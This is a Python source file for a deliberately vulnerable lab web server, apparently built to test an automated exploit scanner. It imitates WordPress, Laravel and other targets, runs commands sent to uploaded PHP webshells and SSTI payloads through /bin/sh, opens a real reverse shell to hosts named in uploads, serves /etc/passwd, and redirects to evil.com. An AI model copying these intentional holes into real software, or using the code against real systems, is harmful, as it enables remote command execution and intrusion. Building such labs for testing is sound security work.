#!/usr/bin/env python3
"""
WebForge CTF Lab — a deliberately vulnerable web app for testing the
auto-exploit / RCE pipeline (upload webshell, SQLi, LFI, SSTI, XSS, SSRF,
open redirect, known-CVE signatures) and the Kubesploit-style C2.

It EMULATES real-world signatures the webforg scanners look for:
  - WordPress + Laravel + PHP/Apache fingerprint markers
  - multipart file upload -> PHP webshell serving with ?cmd= RCE
  - PHP reverse-shell emulation (fsockopen/proc_open -> real /bin/sh)
  - Laravel Ignition CVE-2021-3129, Joomla CVE-2023-23752, Spring CVE-2022-22947
  - .env / .git / phpinfo info disclosure
  - generic SQLi / LFI / SSTI / XSS / SSRF / open-redirect emulation

WARNING: This is a throwaway LAB application. It executes arbitrary commands
and accepts webshells. Bind it ONLY to 127.0.0.1 in an isolated environment.

Usage:  python3 app.py [port]      (default port 8080)
"""
from __future__ import annotations

import json
import os
import re
import socket
import subprocess
import sys
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

FILES: dict[str, bytes] = {}

# ── fingerprint: upload form pages ──────────────────────────────────────────
UPLOAD_FORM_PATHS = {
    "/upload", "/admin/upload", "/admin/uploads", "/admin/file/upload",
    "/admin/filemanager", "/admin/media/upload", "/api/upload", "/api/v1/upload",
    "/file/upload", "/files/upload", "/admin/ajax-upload.php",
    "/admin/content/file/upload", "/manage/upload", "/wp-admin/media-new.php",
    "/wp-admin/plugin-install.php", "/index.php", "/administrator/index.php",
}

FORM_HTML = """<!DOCTYPE html><html><head><title>Media Library</title></head><body>
<h1>Media Library</h1>
<form action="/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="MAX_FILE_SIZE" value="1000000" />
  <!-- enctype="multipart/form-data" -->
  <input type="file" name="file" />
  <input type="submit" value="Upload" />
</form>
</body></html>"""

# ── fingerprint: homepage / marker pages ────────────────────────────────────
HOME_PAGE = """<!DOCTYPE html><html><head>
<title>TechBlog - WordPress 6.4.3</title>
<meta name="generator" content="WordPress 6.4.3" />
</head><body>
<header><h1>TechBlog</h1><nav>
<a href="/wp-login.php">Login</a> | <a href="/wp-json/wp/v2/users">REST API</a> |
<a href="/wp-content/uploads/">Media</a>
</nav></header>
<main><p>Welcome to our WordPress site, built with the Laravel artisan pipeline.</p>
<p>__REFLECT__</p></main>
<footer>Powered by WordPress 6.4.3 &middot; Laravel framework &middot; Apache/PHP</footer>
</body></html>"""

AUTHOR_PAGE = """<!DOCTYPE html><html><head>
<link rel="canonical" href="/author/admin" /></head><body>
<a href="/author/admin">admin</a></body></html>"""

PLUGIN_UPLOAD_PAGE = """<html><body><h1>Install Plugins</h1>
<p>Upload a plugin .zip file: <input type="file" name="pluginzip" disabled /></p>
</body></html>"""

USERS_JSON = json.dumps([{"id": 1, "slug": "admin"}, {"id": 2, "slug": "editor"}])

XMLRPC_GET = """<?xml version="1.0"?><methodResponse>
<params><param><value><array><data>
<value><string>system.listMethods</string></value>
<value><string>wp.getUsersBlogs</string></value>
<value><string>pingback.ping</string></value>
</data></array></value></param></params>
</methodResponse>"""

XMLRPC_POST = """<?xml version="1.0"?><methodResponse>
<params><param><value><array><data>
<value><string>system.listMethods</string></value>
<value><string>wp.getUsersBlogs</string></value>
<value><string>pingback.ping</string></value>
</data></array></value></param></params>
</methodResponse>"""

ENV_CONTENT = """APP_NAME=TechBlog
APP_ENV=local
APP_KEY=base64:abc123def456ghi789jkl0mno1pqr2stu3vwxy
DB_HOST=localhost
DB_DATABASE=techblog
DB_USERNAME=root
DB_PASSWORD=SuperSecretDbP4ss!
"""

PHPINFO = """<html><body><h1>PHP Version 7.4.33</h1>
<table><tr><td>System</td><td>Linux ctf-lab 5.15.0 x86_64</td></tr>
<tr><td>Server API</td><td>Apache 2.0 Handler</td></tr></table></body></html>"""

GITLAB_PAGE = """<html><head><title>GitLab</title></head><body>
<h1>GitLab: Sign in</h1><input type="text" placeholder="username" /></body></html>"""

SQLI_ERROR_PAGE = """<!DOCTYPE html><html><body><h1>Search results</h1>
<p>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /var/www/html/index.php on line 42</p>
<p><b>SQL syntax error</b> near '1'' at line 1</p>
</body></html>"""

HEAPDUMP = ("\x00" * 4096)

STATIC = {
    "/wp-json/wp/v2/users": (USERS_JSON, "application/json"),
    "/xmlrpc.php": (XMLRPC_GET, "text/xml"),
    "/wp-content/debug.log": (
        "PHP Fatal error:  Uncaught Error: Call to undefined function wp_cache_get() "
        "in /var/www/html/wp-content/plugins/tech-widget.php on line 12\n",
        "text/plain",
    ),
    "/wp-admin/plugin-install.php": (PLUGIN_UPLOAD_PAGE, "text/html"),
    "/.env": (ENV_CONTENT, "text/plain"),
    "/_ignition/health-check": ('{"can_reach":true}', "application/json"),
    "/_ignition/execute-solution": ('{"message":"solution executed"}', "application/json"),
    "/api/index.php/v1/users": (
        '{"data":[{"type":"users","id":"1","attributes":{"username":"admin"}}]}',
        "application/json",
    ),
    "/api/index.php/v1/config": (
        '{"data":[{"type":"config","attributes":{"db":{"user":"joomla","password":"joomla_secret"}}}]}',
        "application/json",
    ),
    "/actuator/env": (
        '{"activeProfiles":[],"propertySource":[{"name":"systemProperties"},{"name":"systemEnvironment"}]}',
        "application/json",
    ),
    "/actuator/heapdump": (HEAPDUMP, "application/octet-stream"),
    "/users/sign_in": (GITLAB_PAGE, "text/html"),
    "/api/health": ('{"database":"ok","version":"9.5.2"}', "application/json"),
    "/.git/config": ("[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n", "text/plain"),
    "/.git/HEAD": ("ref: refs/heads/master\n", "text/plain"),
    "/phpinfo.php": (PHPINFO, "text/html"),
    "/info.php": (PHPINFO, "text/html"),
    "/robots.txt": ("User-agent: *\nDisallow: /wp-admin/\n", "text/plain"),
    "/server-status": ("Apache Server Status\n", "text/plain"),
    "/server-info": ("Apache Server Information\n", "text/plain"),
    "/debug": ("debug page\n", "text/plain"),
    "/api-docs": ('{"swagger":"2.0","paths":{}}', "application/json"),
    "/graphql": ('{"data":{}}', "application/json"),
    "/swagger-ui.html": ("<html>Swagger UI</html>", "text/html"),
    "/backup/": ("Index of /backup/\n", "text/plain"),
    "/db/": ("Index of /db/\n", "text/plain"),
    "/sql/": ("Index of /sql/\n", "text/plain"),
    "/phpmyadmin/": ("<html><title>phpMyAdmin</title></html>", "text/html"),
    "/adminer.php": ("<html><title>Adminer</title></html>", "text/html"),
    "/vendor/phpunit/": ("Index of /vendor/phpunit/\n", "text/plain"),
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": (
        "<html><body><p>PHPUnit 5.0.10 — eval-stdin reachable (CVE-2017-9841)</p></body></html>",
        "text/html",
    ),
    "/login.action": ("<html><head><title>Confluence</title></head><body><h1>Atlassian Confluence</h1><p>Sign in to Confluence</p></body></html>", "text/html"),
    "/?_task=login": ("<html><head><title>Roundcube Webmail</title></head><body><h1>Roundcube Webmail</h1><form><input name='_user'></form></body></html>", "text/html"),
    "/webmin/": ("<html><head><title>Webmin 1.920 on localhost</title></head><body><h1>Webmin</h1><p>Login to Webmin</p></body></html>", "text/html"),
    "/tmui/login.jsp": ("<html><head><title>F5 BIG-IP</title></head><body><h1>BIG-IP Configuration Utility</h1></body></html>", "text/html"),
    "/carbon/admin/login.jsp": ("<html><head><title>WSO2 Carbon</title></head><body><h1>WSO2 Carbon Management Console</h1></body></html>", "text/html"),
    "/owa/auth/logon.aspx": ("<html><head><title>Outlook Web App</title></head><body><form>logon</form></body></html>", "text/html"),
    "/autodiscover/autodiscover.xml": (
        '<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006"><Response><Account><Protocol><Type>EXCH</Type></Protocol></Account></Response></Autodiscover>',
        "text/xml",
    ),
    "/login.html": ("<html><head><title>TeamCity</title></head><body><h1>TeamCity 2023.11.2</h1></body></html>", "text/html"),
    "/manager/html": ("<html><head><title>Tomcat Manager</title></head><body><h1>Apache Tomcat/9.0.76 — Manager</h1></body></html>", "text/html"),
}

SQLI_PARAMS = ["id", "page", "search", "q", "cat", "item", "product", "user", "sort", "order", "limit", "offset"]
LFI_PARAMS = ["page", "file", "include", "path", "template", "doc", "pdf", "load", "read"]
SSTI_PARAMS = ["name", "q", "input", "template", "page", "text", "query"]
XSS_PARAMS = ["q", "search", "name", "comment", "input", "query", "text", "title", "desc"]
SSRF_PARAMS = ["url", "uri", "path", "src", "dest", "redirect", "feed", "image", "img", "link"]
REDIRECT_PARAMS = ["url", "redirect", "next", "return", "continue", "dest", "go"]

SHELL_PREFIX = re.compile(
    r"^/(?:uploads|files|wp-content/uploads|images|media|attachments|sites/default/files|tmp|temp|data/uploads|user_uploads)/"
)


# ── webshell / reverse-shell emulation ──────────────────────────────────────

def _exec(cmd: str) -> str:
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=20)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return f"[!] exec error: {e}"


def _spawn_revshell(text: str) -> None:
    m = re.search(r"fsockopen\s*\(\s*['\"]([^'\"]+)['\"]\s*,\s*(\d+)", text)
    if not m:
        return
    host, port = m.group(1), int(m.group(2))

    def _go():
        try:
            s = socket.create_connection((host, port), timeout=15)
            subprocess.Popen(["/bin/sh", "-i"], stdin=s, stdout=s, stderr=s)
        except Exception:
            pass

    threading.Thread(target=_go, daemon=True).start()


def _store_upload(name: str, content: bytes) -> None:
    names = {name}
    m = re.match(r"^(.*\.php)\.[a-zA-Z0-9]+$", name)
    if m:
        names.add(m.group(1))
    if "%00" in name:
        names.add(name.split("%00")[0])
    for n in names:
        FILES[n] = content
        try:
            with open(os.path.join(UPLOAD_DIR, n), "wb") as f:
                f.write(content)
        except Exception:
            pass


def _lookup_upload(name: str) -> bytes | None:
    if name in FILES:
        return FILES[name]
    m = re.match(r"^(.*\.php)\.[a-zA-Z0-9]+$", name)
    if m and m.group(1) in FILES:
        return FILES[m.group(1)]
    if "%00" in name and name.split("%00")[0] in FILES:
        return FILES[name.split("%00")[0]]
    return None


def _parse_multipart(body: bytes, content_type: str):
    m = re.search(r"boundary=([^;]+)", content_type or "")
    if not m:
        return None, None
    boundary = m.group(1).strip('"')
    for part in body.split(("--" + boundary).encode()):
        part = part.strip(b"\r\n")
        if not part or part.startswith(b"--"):
            continue
        head, _, data = part.partition(b"\r\n\r\n")
        hm = re.search(r'filename="([^"]*)"', head.decode("latin1", "replace"))
        if hm:
            return hm.group(1), data.rstrip(b"\r\n")
    return None, None


class LabHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"
    server_version = "Apache/2.4.57 (Debian)"

    def log_message(self, *a):
        pass

    def _send(self, code: int, body, ctype: str = "text/html"):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Server", "Apache/2.4.57 (Debian)")
        self.send_header("X-Powered-By", "PHP/7.4.33")
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def _serve_upload(self, relpath: str, q: dict) -> bool:
        name = urllib.parse.unquote(relpath).rsplit("/", 1)[-1]
        content = _lookup_upload(name)
        if content is None:
            return False
        text = content.decode("utf-8", "replace")
        is_php = ".php" in name.lower() or "<?php" in text
        if is_php and "fsockopen" in text:
            _spawn_revshell(text)
        cmd = (q.get("cmd") or [None])[0]
        if is_php and cmd is not None:
            self._send(200, _exec(cmd), "text/plain")
        else:
            self._send(200, content, "application/x-php" if is_php else "application/octet-stream")
        return True

    def _handle_generic(self, q: dict) -> bool:
        # LFI / path traversal
        for p in LFI_PARAMS:
            v = (q.get(p) or [""])[0]
            if v and ("../" in v or "..\\" in v or "etc/passwd" in v):
                try:
                    with open("/etc/passwd", "r", encoding="utf-8", errors="replace") as f:
                        self._send(200, f.read(), "text/plain")
                except Exception:
                    self._send(200, "root:x:0:0:root:/root:/bin/bash", "text/plain")
                return True
        # SSTI (before SQLi so command-exec payloads with quotes are routed here)
        for p in SSTI_PARAMS:
            v = (q.get(p) or [""])[0]
            if re.search(r"\{\{.*\}\}|\$\{.*\}|<%=\s*\d|#\{.*\}|{%print|\{[^{}]*\}", v):
                if self._handle_ssti(v):
                    return True
        # XSS (before SQLi so XSS payloads containing quotes are routed here)
        for p in XSS_PARAMS:
            v = (q.get(p) or [""])[0]
            if v and ("<script" in v.lower() or "onerror=" in v.lower() or "alert(" in v):
                self._send(200, HOME_PAGE.replace("__REFLECT__", v), "text/html")
                return True
        # SQL injection
        for p in SQLI_PARAMS:
            v = (q.get(p) or [""])[0]
            if v and ("'" in v or '"' in v or "--" in v or "union" in v.lower()):
                if self._handle_sqli(v):
                    return True
        # SSRF
        for p in SSRF_PARAMS:
            v = (q.get(p) or [""])[0]
            if "169.254.169.254" in v:
                self._send(200, "ami-id: ami-0a1b2c3d4e5f6\nregion: us-east-1\ninstance-type: t2.micro\n", "text/plain")
                return True
            if "127.0.0.1" in v or "localhost" in v or "[::1]" in v:
                try:
                    with open("/etc/passwd", "r", encoding="utf-8", errors="replace") as f:
                        self._send(200, f.read(), "text/plain")
                except Exception:
                    self._send(200, "root:x:0:0:root:/root:/bin/bash", "text/plain")
                return True
        # open redirect
        for p in REDIRECT_PARAMS:
            v = (q.get(p) or [""])[0]
            if v and "evil.com" in v:
                self.send_response(302)
                self.send_header("Server", "Apache/2.4.57 (Debian)")
                self.send_header("Location", "http://evil.com/")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return True
        # wordpress / joomla extras
        if "rest_route" in q:
            self._send(200, USERS_JSON, "application/json")
            return True
        if "author" in q:
            self._send(200, AUTHOR_PAGE, "text/html")
            return True
        return False

    def _handle_sqli(self, v: str) -> bool:
        # MySQL INTO OUTFILE webshell drop (UNION-based file write)
        if "into outfile" in v.lower():
            m = re.search(r"into\s+outfile\s+['\"]([^'\"]+)['\"]", v, re.I)
            code = re.search(r"<\?php.*?\?>", v, re.S | re.I)
            if m and code:
                path = m.group(1)
                if path.startswith("/"):
                    path = path[1:]
                base = os.path.join(UPLOAD_DIR, os.path.basename(path))
                name = os.path.basename(path)
                try:
                    os.makedirs(os.path.dirname(base), exist_ok=True)
                    with open(base, "w", encoding="utf-8") as f:
                        f.write(code.group(0))
                except Exception:
                    pass
                FILES[name] = code.group(0).encode()
                self._send(200, "Query OK, 1 row affected", "text/plain")
                return True
        # @@version extraction (MySQL version fingerprint)
        if "@@version" in v.lower() or "version()" in v.lower():
            self._send(200, "8.0.36-log", "text/plain")
            return True
        # UNION-based injection — behave like a benign query so scanners
        # can confirm the injected column count.
        if "union select" in v.lower():
            self._send(200, '<html><body><h1>Search results</h1><p>0 results found.</p></body></html>', "text/html")
            return True
        self._send(200, SQLI_ERROR_PAGE, "text/html")
        return True

    def _handle_ssti(self, v: str) -> bool:
        # Command execution payloads across template engines (Jinja2/Twig/
        # Smarty/Freemarker). Evaluate the command server-side and return
        # its real output so scanners can confirm RCE.
        cmd = None
        for pat in (
            r"popen\s*\(\s*['\"]([^'\"]+)['\"]",
            r"system\s*\(\s*['\"]([^'\"]+)['\"]",
            r"Execute'?\s*\?\s*new\(\)\s*\(\s*['\"]([^'\"]+)['\"]",
            r"getFilter\(\s*['\"]([^'\"]+)['\"]",
            r"['\"](?:/bin/sh|sh)\s*[\-;]\s*(?:c\s+)?['\"]?\s*([^'\"]+)",
        ):
            m = re.search(pat, v)
            if m:
                cmd = m.group(1)
                break
        if cmd:
            out = _exec(cmd)
            self._send(200, out, "text/plain")
            return True
        # Math probes: evaluate the expression like a real template engine.
        math_map = {
            "{{7*7}}": "49", "{{7*8}}": "56",
            "${7*7}": "49", "${7*8}": "56",
            "<%= 7*7 %>": "49", "<%= 7*8 %>": "56",
            "#{7*7}": "49", "#{7*8}": "56",
            "{%print 7*7%}": "49", "{%print 7*8%}": "56",
            "{7*7}": "49", "{7*8}": "56",
        }
        for probe, result in math_map.items():
            if probe in v:
                self._send(200, result, "text/plain")
                return True
        return True

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        path = parsed.path
        q = urllib.parse.parse_qs(parsed.query)

        m = SHELL_PREFIX.match(path)
        if m:
            if self._serve_upload(path[m.end():], q):
                return
        if path in UPLOAD_FORM_PATHS:
            self._send(200, FORM_HTML, "text/html")
            return
        if path in STATIC:
            body, ctype = STATIC[path]
            self._send(200, body, ctype)
            return
        if q and self._handle_generic(q):
            return
        if path == "/":
            self._send(200, HOME_PAGE, "text/html")
            return
        self._send(404, "404 Not Found", "text/plain")

    def do_POST(self):
        parsed = urllib.parse.urlsplit(self.path)
        path = parsed.path
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        if path == "/xmlrpc.php":
            self._send(200, XMLRPC_POST, "text/xml")
            return
        if path in UPLOAD_FORM_PATHS:
            name, content = _parse_multipart(body, self.headers.get("Content-Type", ""))
            if name:
                _store_upload(name, content)
                url = "/uploads/" + name
                self._send(
                    200,
                    f'<html><body><p>Uploaded successfully. <a href="{url}">open</a></p></body></html>',
                    "text/html",
                )
            else:
                self._send(400, "missing file part", "text/plain")
            return
        self._send(404, "404 Not Found", "text/plain")


def main():
    if PORT in (8443, 4444):
        sys.stderr.write(f"[!] Port {PORT} is commonly used by webforg itself; pick another.\n")
        sys.exit(2)
    try:
        server = ThreadingHTTPServer((HOST, PORT), LabHandler)
    except OSError as e:
        sys.stderr.write(f"[!] Cannot bind {HOST}:{PORT}: {e}\n")
        sys.exit(2)
    print(f"\n  [*] WebForge CTF Lab listening on http://{HOST}:{PORT}")
    print(f"  [*] Uploads dir: {UPLOAD_DIR}")
    print("      LAB ONLY - binds loopback, do not expose to a network.\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  [*] Shutting down.")
        server.shutdown()


if __name__ == "__main__":
    main()
